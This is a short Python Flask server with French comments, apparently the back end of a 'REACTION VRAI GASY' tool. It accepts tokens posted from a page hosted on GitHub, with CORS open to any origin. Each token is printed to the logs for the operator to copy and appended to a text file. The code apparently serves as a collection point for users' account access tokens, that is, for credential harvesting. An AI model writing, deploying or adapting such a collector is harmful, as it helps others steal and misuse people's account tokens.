import os
from flask import Flask, request, jsonify
from flask_cors import CORS

app = Flask(__name__)
CORS(app)  # Autorise GitHub à envoyer les tokens ici

@app.route('/')
def home():
    return "Serveur REACTION VRAI GASY opérationnel !", 200

@app.route('/save-token', methods=['POST'])
def save_token():
    try:
        data = request.get_json()
        token = data.get('token')
        if token:
            # On écrit dans 1.txt (Note: Render efface ce fichier au redémarrage)
            # On affiche aussi le token dans les logs pour que tu puisses le copier
            print(f"NOUVEAU TOKEN REÇU : {token}")
            with open("1.txt", "a") as f:
                f.write(f"{token}\n")
            return jsonify({"status": "success"}), 200
        return jsonify({"status": "no_token"}), 400
    except Exception as e:
        print(f"Erreur : {e}")
        return jsonify({"status": "error"}), 500

if __name__ == "__main__":
    # Très important pour Render :
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
